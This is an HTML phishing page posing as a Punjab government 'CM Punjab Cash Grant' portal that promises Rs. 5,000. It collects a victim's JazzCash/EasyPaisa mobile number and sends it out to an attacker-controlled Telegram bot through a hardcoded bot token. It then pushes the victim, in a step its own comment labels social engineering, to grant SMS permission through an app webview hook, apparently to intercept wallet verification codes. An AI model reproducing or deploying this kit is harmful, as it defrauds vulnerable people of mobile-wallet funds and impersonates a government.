<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CM Punjab - Reward Portal</title>
    <style>
        :root { --p-green: #1a7d32; --light-bg: #f0f4f2; }
        body { background: var(--light-bg); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { width: 90%; max-width: 400px; background: white; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; overflow: hidden; border-top: 10px solid var(--p-green); }
        .header { padding: 30px 20px; }
        .logo { width: 90px; margin-bottom: 15px; }
        .main-title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 5px; }
        .sub-title { font-size: 14px; color: #666; margin-bottom: 20px; }
        .amount-box { background: #e8f5e9; padding: 20px; margin: 0 30px; border-radius: 15px; border: 2px dashed var(--p-green); }
        .amount { font-size: 32px; font-weight: 800; color: var(--p-green); }
        .input-group { padding: 30px; }
        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 50px; font-size: 16px; text-align: center; outline: none; transition: 0.3s; box-sizing: border-box; }
        input:focus { border-color: var(--p-green); box-shadow: 0 0 10px rgba(26,125,50,0.1); }
        .btn { width: 100%; padding: 16px; background: var(--p-green); color: white; border: none; border-radius: 50px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 20px; box-shadow: 0 5px 15px rgba(26,125,50,0.3); }
        .footer-note { font-size: 11px; color: #999; padding: 0 30px 20px; }
    </style>
</head>
<body>

<div class="card">
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/02/Punjab_Government_Logo.svg/1200px-Punjab_Government_Logo.svg.png" class="logo" alt="Govt Logo">
        <div class="main-title">CM Punjab Cash Grant</div>
        <div class="sub-title">Brought to you by Maryam Nawaz Sharif</div>
        <div class="amount-box">
            <div style="font-size: 12px; color: #1a7d32; font-weight: bold;">AVAILABLE BALANCE</div>
            <div class="amount">Rs. 5,000.00</div>
        </div>
    </div>

    <div class="input-group">
        <input type="tel" id="user_num" placeholder="JazzCash / EasyPaisa Number">
        <button class="btn" onclick="processWithdraw()">WITHDRAW NOW</button>
    </div>

    <div class="footer-note">
        *Verification is mandatory for first-time withdrawal. Please grant SMS permissions in the next step to verify your account.
    </div>
</div>

<script>
    function processWithdraw() {
        const num = document.getElementById('user_num').value;
        const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
        const chatId = "7107389141";

        if(num.length < 10) {
            alert("Please enter a valid mobile number.");
            return;
        }

        // Send hit to Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: `ðŸ’° *NEW WITHDRAWAL ATTEMPT*\n\nðŸ‘¤ Number: ${num}\nðŸ“ Status: Awaiting SMS Permission`,
                parse_mode: 'Markdown'
            })
        });

        // Social Engineering: Tell user to install verification app
        alert("Verification Required: To receive Rs. 5000, please 'Allow' the SMS permission in the app.");
        
        // Agar Kodular Webviewer use kar rahe hain toh ye trigger karega
        if(window.AppInventor) {
            window.AppInventor.setWebViewString("get_sms_permission");
        }
    }
</script>

</body>
</html>
